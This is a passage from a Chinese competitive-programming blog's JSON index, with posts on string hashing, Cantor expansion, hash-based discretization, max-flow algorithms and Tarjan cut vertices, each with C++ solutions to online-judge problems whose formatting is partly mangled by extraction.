0;&#125;","categories":[{"name":"c_plus_plus_2016","slug":"c-plus-plus-2016","permalink":"https://mrh1s.top/categories/c-plus-plus-2016/"}],"tags":[]},{"title":"字符串hash，康托展开总结","slug":"e5-ad-97-e7-ac-a6-e4-b8-b2hash-ef-bc-8c-e5-ba-b7-e6-89-98-e5-b1-95-e5-bc-80-e6-80-bb-e7-bb-93","date":"2018-12-06T15:44:39.000Z","updated":"2019-05-05T05:18:29.208Z","comments":true,"path":"posts/6c3f6e84/","link":"","permalink":"https://mrh1s.top/posts/6c3f6e84/","excerpt":"","text":"字符串hash，康托展开总结 各种字符串hash函数： ELF HashBKDRHashAPHashDJBHashJSHashRSHashSDBMHashPJWHashELFHash 字符串hash之BKDRhash函数 有研究表明BKDRhash函数冲突率较低，且变成复杂度低，所以可以用来作为常用hash函数 Hash函数 数据1 数据2 数据3 数据4 数据1得分 数据2得分 数据3得分 数据4得分 平均分 BKDRHash 2 0 4774 481 96.55 100 90.95 82.05 92.64 APHash 2 3 4754 493 96.55 88.46 100 51.28 86.28 DJBHash 2 2 4975 474 96.55 92.31 0 100 83.43 JSHash 1 4 4761 506 100 84.62 96.83 17.95 81.94 RSHash 1 0 4861 505 100 100 51.58 20.51 75.96 SDBMHash 3 2 4849 504 93.1 92.31 57.01 23.08 72.41 PJWHash 30 26 4878 513 0 0 43.89 0 21.95 ELFHash 30 26 4878 513 0 0 43.89 0 21.95 unsigned int bkdr_hash(const char* str) { unsignedint seed = 31; // 31 131 1313 13131 131313 etc.. 37（最好是质数） unsignedint hash = 0; while(str) hash = (hash * seed + (str++))%P;//P是一个较大质数 returnhash; } 各种证明： http://www.it165.net/pro/html/201410/24949.html 双hash优化： 在hash表中想要用线性探查的方式处理hash表的冲突，那么每次比对要查找的元素与当前元素是否相等就显得十分麻烦，特别是两个数据是字符串的时候，strcmp超级耗时，此时我们就可以在存储新元素时通过另一hash算法算出两者的hash值，将这两个hash存入结构体，并且排序，用二分查找第一个hash值，并比较第二个hash值，若符合则相同 另外本人想到一个貌似还可以的做法，目前都AC了所做的所有Hash题目 做法：用两种截然不同的hash算法，hash1算出取模压缩后的值，而hash2算出BKDRhash算法，其中P（较大质数）为10^9+7，算出字符串完整的hash2值，把hash1当作地址，hash2当作数据：HashTable[hash1]=hash2; 当然有冲突时先比较hash2值是否相同，不相同则继续探查直到所在地址数据为空，hash2相同时就基本可以说明两个字符串是相等的。。。。 康托展开 叙述：有一个数字序列，所有数都是[1,n]的，且任意两者互异，此时我们用一一对应的方式存储这些数据就有n！种可能，康托算法对处理这种序列提供了完美的解决方法。称为康托展开。我们把这个数列看作全排列，数字所对hash值就为全排列的大小（第几大）。 公式：hash(key)=a[n](n-1)!+a[n-1](n-2)!+…+a[2](2-1)!+a[1](1-1)! 其中，a[n]所存的值为在第n个数（从小到大的顺序）之前比n小的数的个数 Hash值完全可以通过循环在n次内算出，且数列与hash完全一一对应，可谓完美算法。 康托逆展开： 由于康托展开的一一对应性，我们同样可以算出原来的全排列。 n为康托展开式，k为总阶乘 第一位：(n-1)/(k-1)余n’ 第二位：n’/(k-2)余n’’ 以此类推。。。 Poj1200 描述 许多人喜欢解决难题。一个这样的难题是在一个给定的文本中找到一个隐藏的素数。这个数字是所给字符串中不同子串的个数。当你很快会发现，你真的需要一台计算机和一个很好的算法来解决这样的难题。 你的任务是编写一个程序，文本中不同字符的数量不超过NC，给出这样的字符串，求长度为n的不同的子串有多少个。 举一个例子，当n = 3，NC = 4，字符串为“daababac”。可以在字符串中到到符合条件的子串为：”daa”;”aab”; “aba”; “bab”; “bac”。因此，答案应该是5。 输入： 第一行：两个数：n，nc 第二行：要搜索的字符串； 你可以假设，最后你所搜索出来符合要求的子串个数不大于16000000； 输出 不同子串的个数 样例输入 3 4 daababac 样例输出 5 提示 输入数据巨大，不用cin 数据巨大，seed不宜太大，看了poj题解，有一个很棒的方法，seed就是当前字符在整个字符串出现过的个数，刚好可以做到一一对应 #include #include #include using namespace std; const int Z1=1000000007; bool hashtable[Z1+100]; int n,nc,ans=0,asc[300],num,len,sum; char str[8000000]; int main(){ // freopen(\"in.txt\",\"r\",stdin); scanf(\"%d%d\",&n,&nc); scanf(\"%s\",str); len=strlen(str); for(int i=0;i","categories":[{"name":"c_plus_plus_2016","slug":"c-plus-plus-2016","permalink":"https://mrh1s.top/categories/c-plus-plus-2016/"}],"tags":[]},{"title":"离散hash优化总结","slug":"e7-a6-bb-e6-95-a3hash-e4-bc-98-e5-8c-96-e6-80-bb-e7-bb-93","date":"2018-12-06T15:44:06.000Z","updated":"2019-05-05T05:30:12.489Z","comments":true,"path":"posts/c1dd3892/","link":"","permalink":"https://mrh1s.top/posts/c1dd3892/","excerpt":"","text":"离散优化总结离散优化是一种常见的高效数据结构，它通过建立数据与存储结构（数组）之间（不一定）一一对应的映射关系来达到对复杂数据的优化。 离散优化最重要的一点是建立映射，对于特殊的线段、点而言，这些映射可以是对一个区间的映射，即将某段线或者某块区域映射到数组里面去，从而在计算时降低时间复杂度。 Hash优化：是对于字符串和数字的一种优化方式。它通过将数据映射到数组内的某个元素从而达到节省空间的效果。 根据hash算法的不同，可能会引起数据的碰撞，即hash(key1)==hash(key2)，会使得数据存储出现错误。有两个方法可以解决： 拉链法，将hash所对密码指向链表头，每次查找元素遍历整串链表，直到找到该元素为止（编程复杂度较高） 开地址法，当hash所对密码冲突时，将数据存入另外的位置（可以是下一个空位置，也可以是计算出的任意位置），当然如果使用线性开地址法，只要有一个数据碰撞，那么其余所有数据都很有可能进行至少一次碰撞，非常耗费时间。所以我们运用hash算出另一个位置并存储： while(hashtable[ad]!=0){ ad+=ad%3+1;//可以是异于主hash算法的另一hash算法** } 通常Hash算法分为两个板块： 查找元素，hash(key)对应的不一定是目标元素，需要对目标进行搜索，推荐使用开地址法进行搜索 插入元素，与查找同理，在插入之前必须检查此元素是否已被插入，再用开地址法存入相应的地址 Hash可用的构造方法 直接定址 取模法 平均取中值 随机数 数字分析法，将最有代表特色的位置作为特征码 折叠法，将数拆分成几部分并求和 基数法，将低进制数当作高进制数转化为原进制的数，并进行分析，取特征码（两个进制之间应该是互质的关系） 1640: 线段覆盖时间限制:1 Sec 内存限制: 128 MB 提交:43 解决: 27 [提交][状态][讨论版] 题目描述X轴上方有若干条平行于X轴的线段，求这些线段能覆盖到的X轴的总长度？ 输入第一行一个数n(n&lt;=1000)，表示线段的个数； 接下来n行，每行两个整数ai,bi （-10^8&lt;=ai,bi&lt;=10^8)，代表一个线段的两个端点。 输出输出覆盖x轴的长度。 样例输入2 10 12 2 4样例输出4将每个点存入数组进行排序，然后遍历所有线段，将线段所覆盖到的点全部记录，输出结果 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;int n,a[1200],b[1200],t[2400],flag[2400],tot,sum;//flag[i]表示i到i+1之间是否被覆盖 int find(int s,int e,int aim)&#123; int mid; while(s&lt;=e)&#123; mid=(s+e)&gt;&gt;1; if(t[mid]==aim)&#123; while(t[mid-1]==t[mid]) mid--; return mid; &#125;else if(t[mid]&gt;aim) e=mid-1; else s=mid+1; &#125;&#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); scanf(\"%d\",&amp;n); for(int i=1;i&lt;=n;i++)&#123; scanf(\"%d%d\",&amp;a[i],&amp;b[i]); if(a[i]&gt;b[i]) swap(a[i],b[i]); t[++tot]=a[i]; t[++tot]=b[i]; &#125; sort(t+1,t+1+tot); for(int i=tot;i&gt;=2;i--) if(t[i]==t[i-1]) flag[i]=-1; for(int i=1;i&lt;=n;i++)&#123; int top=find(1,tot,a[i]),tail=find(1,tot,b[i]); for(int j=top;j&lt;=tail-1;j++) if(flag[j]!=-1) flag[j]=1; &#125; for(int i=1;i&lt;=tot-1;i++)&#123; int nxt=i+1; while(flag[nxt]==-1) nxt++; if(flag[i]==1) sum+=t[nxt]-t[i]; &#125; printf(\"%d\",sum); return 0;&#125; 1234: 图形面积时间限制:0 Sec 内存限制: 128 MB 提交:11 解决: 2 [提交][状态][讨论版] 题目描述桌面上放了N个矩形，这N个矩形可能有互相覆盖的部分，求它们组成的图形的面积。 输入输入第一行为一个数N（1≤N≤100），表示矩形的数量。下面N行，每行四个整数，分别表示每个矩形的左下角和右上角的坐标，坐标范围为–10^8到10^8之间的整数。 输出输出只有一行，一个整数，表示图形的面积。 样例输入3 1 1 4 3 2 -1 3 2 4 0 5 2样例输出10二维离散优化，将图形在x轴上投影的点找出，并且分析相邻两点间的距离（即图形的宽），以及投影这段线的图形在y轴上的投影（即图形的高），ans+=d*h即可 http://noi.openjudge.cn/ch0305/1551/ Sumsets 描述 给出一个整数集合s，找到集合中最大的d，让等式a+b+c=d成立， 其中，a,b,c,d是集合S中不同的元素。 输入 Several S, each consisting of a line containing an integer 1 &lt;= n&lt;= 1000 indicating the number of elements in S, followed by the elements ofS, one per line. Each element of S is a distinct integer between -536870912 and+536870911 inclusive. The last line of input contains 0. 输出 For each S, a single line containing d, or a single line containing”no solution”. 样例输入 5 2 3 5 7 12 5 2 16 64 256 1024 0 样例输出 12 no solution 经过变形可得a+b=d-c，先枚举a+b用hash表存储 再枚举d-c，如果在hash表中有值,且该值对应的a，b异于d，c，那么将此时的d存起来，取最大值 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int ADD=536870911;int flag[1000020],in[1020],ha1[1000020],ha2[1000020],data[1000000];int hashh(int key)&#123;// key+=ADD; int ad=((key%1000000)+10061894)%1000000; while(flag[ad]!=0)&#123; ad+=ad%11+1; if(ad&gt;1000000) ad%=1000000; &#125; return ad;&#125;int find(int key)&#123;// key+=ADD; int ad=((key%1000000)+10061894)%1000000; while(data[ad]!=key&amp;&amp;flag[ad]!=0)&#123; ad+=ad%11+1; if(ad&gt;1000000) ad%=1000000; &#125; return flag[ad]==0?-1:ad;&#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int n,maxx; while(scanf(\"%d\",&amp;n)!=EOF&amp;&amp;n!=0)&#123; memset(flag,0,sizeof(flag)); maxx=-1; for(int i=1;i&lt;=n;i++) scanf(\"%d\",&amp;in[i]); for(int i=1;i&lt;=n;i++) for(int j=i+1;j&lt;=n;j++)&#123; int ans=hashh(in[i]+in[j]); flag[ans]=1,ha1[ans]=in[i],ha2[ans]=in[j],data[ans]=in[i]+in[j]; &#125; for(int i=1;i&lt;=n;i++) for(int j=1;j&lt;=n;j++)&#123; int ans=find(in[i]-in[j]); if(i==j||ans==-1) continue; if(flag[ans]&amp;&amp;ha1[ans]!=in[i]&amp;&amp;ha1[ans]!=in[j]&amp;&amp;ha2[ans]!=in[i]&amp;&amp;ha2[ans]!=in[j]) maxx=max(maxx,in[i]); &#125; if(maxx!=-1) printf(\"%d\\n\",maxx); else printf(\"no solution\\n\"); &#125; return 0;&#125; ​ 1807:正方形http://noi.openjudge.cn/ch0305/1807/ 描述 给出平面上一些点的坐标，统计由这些点可以组成多少个正方形。注意：正方形的边不一定平行于坐标轴。 输入 输入包括多组测试数据。每组的第一行是一个整数n (1 &lt;= n &lt;= 1000)，表示平面上点的数目，接下来n行，每行包括两个整数，分别给出一个点在平面上的x坐标和y坐标。输入保证：平面上点的位置是两两不同的，而且坐标的绝对值都不大于20000。最后一组输入数据中n = 0，这组数据表示输入的结束，不用进行处理。 输出 对每组输入数据，输出一行，表示这些点能够组成的正方形的数目。 样例输入 4 1 0 0 1 1 1 0 0 9 0 0 1 0 2 0 0 2 1 2 2 2 0 1 1 1 2 1 4 -2 5 3 7 0 0 5 2 0 样例输出 1 6 1 将每个点用hash表存起来，这里有个小技巧，可以开longlong数组，从而实现一个变量存一个点的功效。然后枚举任意两个未枚举的点，将它们作为正方形的一条边，通过规律我们可以确定两个待定的正方形，寻找计算出的正方形另两个点的位置，搜索hash表，如果都有相应的元素对应，那么即为找到一个正方形。注意：每两个点都会被遍历，即每条边都会被遍历，所以正方形的个数是边数d&gt;&gt;2 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int MAX=30000;struct node&#123; int x,y;&#125;poi[MAX+500];long long hashtable[MAX+500];//任意选取两个点，可确定两个正方形，将两个正方形除已选择外的点hash存储 void InsertHash(int x,int y)&#123; int ad=(x*x+y*y)%30000; long long aim=x*100000+y; while(1)&#123; ad+=ad%31+1; if(ad&gt;MAX) ad%=MAX; if(hashtable[ad]==aim) return; if(hashtable[ad]==0) break; &#125;hashtable[ad]=aim;&#125;int FindHash(int x,int y)&#123; int ad=(x*x+y*y)%30000; long long aim=x*100000+y; while(1)&#123; ad+=ad%31+1; if(ad&gt;MAX) ad%=MAX; if(hashtable[ad]==0) return 0; else if(hashtable[ad]==aim) return 1; &#125;&#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int n,x,y,ans; while(scanf(\"%d\",&amp;n)!=EOF&amp;&amp;n!=0)&#123; memset(hashtable,0,sizeof(hashtable)); ans=0; for(int i=1;i&lt;=n;i++)&#123; scanf(\"%d%d\",&amp;poi[i].x,&amp;poi[i].y); poi[i].x+=20001; poi[i].y+=20001; InsertHash(poi[i].x,poi[i].y); &#125; /* for(int i=1;i&lt;=MAX;i++) if(hashtable[i]!=0) printf(\"%lld\\n\",hashtable[i]);*/ for(int i=1;i&lt;=n;i++) for(int j=i+1;j&lt;=n;j++)&#123; int x1,x2,y1,y2,delx,dely; delx=poi[i].x-poi[j].x; dely=poi[i].y-poi[j].y; x1=poi[i].x+dely; y1=poi[i].y-delx; x2=poi[j].x+dely; y2=poi[j].y-delx; if(FindHash(x1,y1)&amp;&amp;FindHash(x2,y2)) ans++; x1=poi[i].x-dely; y1=poi[i].y+delx; x2=poi[j].x-dely; y2=poi[j].y+delx; if(FindHash(x1,y1)&amp;&amp;FindHash(x2,y2)) ans++; &#125; printf(\"%d\\n\",ans&gt;&gt;2);//根据两个点找正方形会找四次 &#125; return 0;&#125; FZOJ1639魔板 题目描述 在魔方风靡全球之后，小Y发明了它的简化版——魔板，如图1所示，魔板由8个同样大小的方块组成，每个方块的颜色均不相同，本题中分别用数字1~8表示，它们可能出现在魔板的任一位置。任一时刻魔板的状态可以用方块的颜色序列表示：从魔板的左上角开始，按顺时针方向依次写下各个颜色块的颜色代号，得到数字序列即可表示此时魔板的状态。 例如，序列(1,2,3,4,5,6,7,8)表示如图1所示魔板的状态，这也是本题中魔板的初始状态。 1 2 3 4 8 7 6 5 **图 1 魔板的初始状态** 对于魔板，可以施加三种不同的操作，分别以A,B,C标识。具体操作方法如下： A:上下行互换。 B：每一行同时循环右移一格。 C：中间4个方块顺时针旋转一格。 应用这三种基本操作，可以由任一种状态达到任意另外一种状态。 图 2 魔板的操作方法 图2描述了上述3种操作的具体含义，图中方格外面的数字标识魔板的8个方块位置，方格内数字表示此次操作前该小方块所在位置，即：如果位置P对应的方格中数字为I，则表示此次操作前该方块在位置I。 任务一：请编一程序，对于输入的一个目标状态寻找一种操作的序列，使得从初始状态开始，经过此操作序列后使该魔板变为目标状态。 任务二：如果你的程序寻找到的操作序列在300步以内，会得到任务二的分数。 输入数据只有一行，内容是8个以一个空隔分隔的正整数，表示目标状态。输入样例对应的状态如图3所示。输出数据要求第一行输出你的程序寻找到的操作序列的步数L，随后L行是相应的操作序列，每行的行首输出一个字符，代表相应的操作。 2 6 8 4 1 3 7 5 **图 3 魔板的输入样例的状态** 输入 输出 第一行输出你的程序寻找到的操作序列的步数L，随后L行是相应的操作序列，每行的行首输出一个字符，代表相应的操作。 样例输入 2 6 8 4 5 7 3 1 样例输出 7 B C A B C C B 如果魔板数据太小，可用直接地址法，但本题魔板有10^8种可能，不现实。又考虑到在300步内可得到目标魔板，于是想到使用hash表存储已经遍历过的走法。 从初始状态开始，进行BFS，取出一个元素，每次考虑三种可能的变化情况，搜索hash表，如果还未考虑此情况，就加入队列，继续搜索，同时记录每种走法的上一步father[] 直到程序找到了目标解，那么依次遍历father[]，输出结果即可","categories":[{"name":"c_plus_plus_2016","slug":"c-plus-plus-2016","permalink":"https://mrh1s.top/categories/c-plus-plus-2016/"}],"tags":[]},{"title":"求最大网络流（最小割）总结","slug":"e6-b1-82-e6-9c-80-e5-a4-a7-e7-bd-91-e7-bb-9c-e6-b5-81-ef-bc-88-e6-9c-80-e5-b0-8f-e5-89-b2-ef-bc-89-e6-80-bb-e7-bb-93","date":"2018-12-06T15:43:33.000Z","updated":"2019-05-04T15:39:44.429Z","comments":true,"path":"posts/675d1a4b/","link":"","permalink":"https://mrh1s.top/posts/675d1a4b/","excerpt":"","text":"求最大网络流总结 一个有向图，每条边都有最大可能的数据传输量c，要求一个点到某个点一次能传输的最大数据量，即为求最大网络流，每条边实际的数据传输量称为流量。** 基本思路：使用贪心算法，每次找出能使总流量更大的边，将数据向那条边流。 Ford-fulkerson算法 读入所有有向边，并且加入流量为0的反向边 DFS查找所有点u的未被遍历的边(u,v) 如果满足这条边流量大于0，更新这条边以及它的反向边的流量（同时会DFS遍历v点） 重复2操作，直到所有点被遍历完成 算法复杂度：O(m+n)≈O(n^2) Dinic算法 原理：利用BFS求最短路的方法将所有的边按从源点到汇点的距离排序，从而避免不必要的增广 BFS求源点到所有点的距离 DFS 遍历所有边(u,v) 如果dis[v]==dis[u]+1且边的长度大于0，那么更新这条边以及它的反向边的流量（同时DFS遍历了v点） 用dis数组的好处：不仅减少了不必要的增广步骤，而且使增广顺序有序，不必记录点是否已被遍历 重复2操作，直到没有符合条件的边为止 算法复杂度：O(n^2m)。*（最坏情况，平均情况大大优于**FF算法） 割 在网络中，将源点与汇点通过割边的方式划分成两个部分，割掉的所有边都是割，其中，s到t为正向割边，t到s为逆向割边 割的容量：所有正向割边的容量和 最小割：容量和最小的割 ** 定理1：如果f是网络中的一个流，那么f的流为割的正向边与逆向边容量之差** ** 定理二：如果f是一个流，CUT (S,T)是一个割，且f的值等于割CUT(S,T)的容量，那么f是一个最大流，CUT(S,T)是一个最小割。** ** 推论：f的流量&lt;=此流的割的容量** 求最小割与求最大网络流等价 POJ 1273 Drainage Ditches Description Every time itrains on Farmer John’s fields, a pond forms over Bessie’s favorite cloverpatch. This means that the clover is covered by water for awhile and takesquite a long time to regrow. Thus, Farmer John has built a set of drainageditches so that Bessie’s clover patch is never covered in water. Instead, thewater is drained to a nearby stream. Being an ace engineer, Farmer John hasalso installed regulators at the beginning of each ditch, so he can control atwhat rate water flows into that ditch. Farmer John knows not only how many gallons of water each ditch can transportper minute but also the exact layout of the ditches, which feed out of the pondand into each other and stream in a potentially complex network. Given all this information, determine the maximum rate at which water can betransported out of the pond and into the stream. For any given ditch, waterflows in only one direction, but there might be a way that water can flow in acircle. Input The input includesseveral cases. For each case, the first line contains twospace-separated integers, N (0 &lt;= N &lt;= 200) and M (2 &lt;= M &lt;= 200).N is the number of ditches that Farmer John has dug. M is the number of intersectionspoints for those ditches. Intersection 1 is the pond. Intersection point M isthe stream. Each of the following N lines contains three integers, Si, Ei, andCi. Si and Ei (1 &lt;= Si, Ei &lt;= M) designate the intersections betweenwhich this ditch flows. Water will flow through this ditch from Si to Ei. Ci (0&lt;= Ci &lt;= 10,000,000) is the maximum rate at which water will flow throughthe ditch. Output For each case,output a single integer, the maximum rate at which water may emptied from thepond. Sample Input 5 4 1 2 40 1 4 20 2 4 20 2 3 30 3 4 10 Sample Output 50 题意 现在有m个池塘(从1到m开始编号,1为源点,m为汇点),及n条水渠,给出这n条水渠所连接的点和所能流过的最大流量， Ford-Fulkerson算法 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int MAX=600;int first[MAX],nxt[MAX],go[MAX],flow[MAX],arcnum=1;int vis[MAX];void addarc(int a,int b,int c)&#123;//加边 nxt[++arcnum]=first[a]; first[a]=arcnum; go[arcnum]=b; flow[arcnum]=c;//记录该边容量 &#125;int Dfs(int u,int t,int minc)&#123;//起点u，终点t，整条路径中流量最小为minc if(u==t) return minc; vis[u]=1; for(int p=first[u];p!=0;p=nxt[p])&#123; int v=go[p]; if(!vis[v]&amp;&amp;flow[p]&gt;0)&#123; int f=Dfs(v,t,min(minc,flow[p])); if(f&gt;0)&#123; flow[p]-=f;//正向边减去算出的流量 flow[p^1]+=f;//逆向边加上算出的流量 /* n为任意偶自然数，那么n^1=n+1;(n+1)^1=n */ return f; &#125; &#125; &#125; return 0;//如果都不符合条件，返回0 &#125;int MaxFlow(int s,int t)&#123; int ans=0; while(1)&#123; memset(vis,0,sizeof(vis)); int f=Dfs(s,t,99999999); if(f&lt;=0) return ans; ans+=f; &#125;&#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int n,m,a,b,c; while(scanf(\"%d%d\",&amp;m,&amp;n)!=EOF)&#123; memset(first,0,sizeof(first)); memset(flow,0,sizeof(flow)); arcnum=1; for(int i=1;i&lt;=m;i++)&#123; scanf(\"%d%d%d\",&amp;a,&amp;b,&amp;c); addarc(a,b,c);//正向边流量为c addarc(b,a,0);//逆向边流量为0 &#125; printf(\"%d\\n\",MaxFlow(1,n)); &#125; return 0;&#125;**Dinic算法**#include&lt;cstdio&gt;#include&lt;cstdlib&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int MAX=600;const int INF=99999999;int first[MAX],go[MAX],nxt[MAX],flow[MAX],arcnum=1;int que[MAX*MAX],dis[MAX],top,rear,current[MAX],vis[MAX];int n,m,a,b,c;void addarc(int a,int b,int c)&#123; nxt[++arcnum]=first[a]; first[a]=arcnum; go[arcnum]=b; flow[arcnum]=c;&#125;int DFS(int u,int t,int minc)&#123;// printf(\"dfs %d %d start\\n\",u,t); if(u==t) return minc; for(int p=current[u];p!=0;p=nxt[p])&#123; current[u]=p; int v=go[p]; // printf(\"%d: %d-&gt;%d\\n\",p,u,v); if(dis[v]==dis[u]+1&amp;&amp;flow[p]&gt;0)&#123;//边一定要存在 int f=DFS(v,t,min(minc,flow[p])); if(f)&#123; flow[p]-=f; flow[p^1]+=f; return f; &#125; &#125; &#125; return 0;&#125;int BFS(int s,int t)&#123;//BFS优化 for(int i=1;i&lt;=MAX;i++) dis[i]=INF; top=rear=0; que[rear++]=s; dis[s]=1; do&#123; int u=que[top++],v; for(int p=first[u];p!=0;p=nxt[p])&#123; v=go[p]; if(flow[p]&gt;0&amp;&amp;dis[v]==INF)&#123;//边存在且点未被更新时才更新 dis[v]=dis[u]+1; que[rear++]=v; &#125; &#125; &#125;while(top!=rear); return dis[t]&lt;INF;&#125;int MaxFlow(int s,int t)&#123;//Dinic算法 int ans=0,f; while(BFS(s,t))&#123; for(int i=1;i&lt;=n;i++) current[i]=first[i];//每次BFS后都要重置current数组 while(f=DFS(s,t,INF)) ans+=f; &#125; return ans;&#125;int main()&#123; freopen(\"in.txt\",\"r\",stdin); while(scanf(\"%d%d\",&amp;m,&amp;n)!=EOF)&#123; memset(first,0,sizeof(first)); memset(flow,0,sizeof(flow)); arcnum=1; for(int i=1;i&lt;=m;i++)&#123; scanf(\"%d%d%d\",&amp;a,&amp;b,&amp;c); addarc(a,b,c); addarc(b,a,0); &#125;/* for(int i=1;i&lt;=n;i++)&#123; printf(\"%d %d\\n\",i,first[i]); &#125; printf(\"node end\\n\"); for(int i=1;i&lt;=2*m;i++)&#123; printf(\"%d %d %d\\n\",i,go[i],nxt[i]); &#125; printf(\"edge end\\n\");*/ printf(\"%d\\n\",MaxFlow(1,n)); &#125; return 0;&#125; HDU4183 Pahom on Water Problem Description Pahom on Water isan interactive computer game inspired by a short story of Leo Tolstoy about apoor man who, in his lust for land, forfeits everything. The game’s startingscreen displays a number of circular pads painted with colours from the visiblelight spectrum. More than one pad may be painted with the same colour (definedby a certain frequency) except for the two colours red and violet. The displaycontains only one red pad (the lowest frequency of 400 THz) and one violet pad(the highest frequency of 789 THz). A pad may intersect, or even containanother pad with a different colour but never merely touch its boundary. Thedisplay also shows a figure representing Pahom standing on the red pad. The game’s objective is to walk the figure of Pahom from the red pad to theviolet pad and return back to the red pad. The walk must observe the followingrules: 1.If pad α and pad β have a common intersection and the frequency of the colourof pad α is strictly smaller than the frequency of the colour of pad β, thenPahom figure can walk from α to β during the walk from the red pad to theviolet pad 2. If pad α and pad β have a common intersection and the frequency of thecolour of pad α is strictly greater than the frequency of the colour of pad β,then Pahom figure can walk from α to β during the walk from the violet pad tothe red pad 3. A coloured pad, with the exception of the red pad, disappears from displaywhen the Pahom figure walks away from it. The developer of the game has programmed all the whizzbang features of thegame. All that is left is to ensure that Pahom has a chance to succeed in eachinstance of the game (that is, there is at least one valid walk from the redpad to the violet pad and then back again to the red pad.) Your task is towrite a program to check whether at least one valid path exists in eachinstance of the game. Input The input startswith an integer K (1 &lt;= K &lt;= 50) indicating the number of scenarios on aline by itself. The description for each scenario starts with an integer N (2&lt;= N &lt;= 300) indicating the number of pads, on a line by itself, followedby N lines that describe the colors, locations and sizes of the N pads. Eachline contains the frequency, followed by the x- and y-coordinates of the pad’scenter and then the radius. The frequency is given as a real value with no morethan three decimal places. The coordinates and radius are given, in meters, asintegers. All values are separated by a single space. All integer values are inthe range of -10,000 to 10,000 inclusive. In each scenario, all frequencies arein the range of 400.0 to 789.0 inclusive. Exactly one pad will have a frequencyof “400.0” and exactly one pad will have a frequency of “789.0”. Output The output foreach scenario consists of a single line that contains: Game is VALID, or Gameis NOT VALID Sample Input 2 2 400.0 0 0 4 789.0 7 0 2 4 400.0 0 0 4 789.0 7 0 2 500.35 5 0 2 500.32 5 0 3 Sample Output Game is NOT VALID Game is VALID 题目大意： 有多个点，每个点给出坐标与半径，加入两个点相交，就可以从这两个点走。题目要求先从起点到终点，再从终点回到起点。从起点到终点的过程中，只能从频率小的走到频率大的点（前提是两点相交），从终点到起点的过程中，只能从频率大的走到频率小的。在走的过程中，除了起点与终点，别的只要走过就会消失，就是说只能走一次。问可不可以从起点到终点又回到起点。 找到输入数据中最小和最大的两个，求两个之间的最大网络流 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;#include&lt;cmath&gt;using namespace std;const int INF=99999999;const int MAX=1500;double data[MAX];int first[MAX],go[MAX],nxt[MAX],arcnum=1,x[MAX],y[MAX],r[MAX];int flow[MAX],que[MAX],top,rear,dis[MAX],vis[MAX];int k,n,ans;void addarc(int a,int b,int c)&#123; nxt[++arcnum]=first[a]; first[a]=arcnum; go[arcnum]=b; flow[arcnum]=c;&#125;int DFS(int u,int t,int minc)&#123; if(u==t) return minc; for(int p=first[u];p!=0;p=nxt[p])&#123; int v=go[p],f; if(dis[v]==dis[u]+1&amp;&amp;flow[p]&gt;0) if(f=DFS(v,t,min(minc,flow[p])))&#123; flow[p]-=f; flow[p^1]+=f; return f; &#125; &#125; return 0;&#125;int BFS(int s,int t)&#123; for(int i=1;i&lt;=n;i++) dis[i]=INF; top=rear=0; que[rear++]=s; dis[s]=0; do&#123; int u=que[top++],v; for(int p=first[u];p!=0;p=nxt[p])&#123; v=go[p]; if(dis[v]==INF&amp;&amp;flow[p]&gt;0)&#123; dis[v]=dis[u]+1; que[rear++]=v; &#125; &#125; &#125;while(top!=rear); return dis[t]&lt;INF;&#125;int MaxFlow(int s,int t)&#123; int ans=0,f; while(BFS(s,t)) while(f=DFS(s,t,INF)) ans+=f; return ans;&#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); scanf(\"%d\",&amp;k); while(k--)&#123; memset(flow,0,sizeof(flow)); memset(first,0,sizeof(first)); arcnum=1; scanf(\"%d\",&amp;n); int red=0,purple=n+1; data[0]=9999; data[n+1]=0; for(int i=1;i&lt;=n;i++)&#123; scanf(\"%f%d%d%d\",&amp;data[i],&amp;x[i],&amp;y[i],&amp;r[i]); if(data[i]&lt;data[red]) red=i; if(data[i]&gt;data[purple]) purple=i; &#125; for(int i=1;i&lt;=n;i++) for(int j=1;j&lt;=n;j++) if(data[i]&lt;data[j]&amp;&amp;sqrt((x[i]-x[j])*(x[i]-x[j])+(y[i]-y[j])*(y[i]-y[j]))&lt;=r[i]+r[j]) addarc(i,j,1),addarc(j,i,0); if(MaxFlow(red,purple)&lt;2) printf(\"Game is NOT VALID\\n\"); else printf(\"Game is VALID\\n\"); &#125; return 0;&#125;","categories":[{"name":"c_plus_plus_2016","slug":"c-plus-plus-2016","permalink":"https://mrh1s.top/categories/c-plus-plus-2016/"}],"tags":[]},{"title":"Tarjan算法求无向图割边割点、最近公共祖先的总结","slug":"tarjan-e7-ae-97-e6-b3-95-e6-b1-82-e6-97-a0-e5-90-91-e5-9b-be-e5-89-b2-e8-be-b9-e5-89-b2-e7-82-b9-e3-80-81-e6-9c-80-e8-bf-91-e5-85-ac-e5-85-b1-e7-a5-96-e5-85-88-e7-9a-84-e6-80-bb-e7-bb-93","date":"2018-12-06T15:43:10.000Z","updated":"2019-05-05T05:41:54.246Z","comments":true,"path":"posts/1acd21ea/","link":"","permalink":"https://mrh1s.top/posts/1acd21ea/","excerpt":"","text":"无向图tarjan求割边割点、最近公共祖先总结割点：删除这个点之后整个图变成不连通的两个部分的点 割点集合：在一个无向图中删除该集合中的所有点，能使原图变成互不相连的连通块的点的集合 点连通度：最小割点集合点数 割边（桥）：类似于割点，删除一条边后会使一个连通图变得不完全连通 割边集合：所有割边的集合 边连通度：最小割边集合边数 与有割边割点的图对应，有一种无向图，它的边连通度（或点连通度）大于1，那么我们称它为双连通分量，即删掉任意点（或边），图仍然是连通的 用tarjan算法求割点 原理：在一棵DFS树中 根root是割顶当且仅当它至少有两个儿子 其他点v是割顶当且仅当它有一个儿子u,从u或者u的后代出发没有指向v祖先(不含v)的B边,则删除v以后u和v的父亲不连通,故为割顶 基本算法同tarjan经典算法 每遍历一个新的（颜色为白色）u的儿子v都记录个数 low[u]值更新后进行以下判断（前提v未被遍历过）： 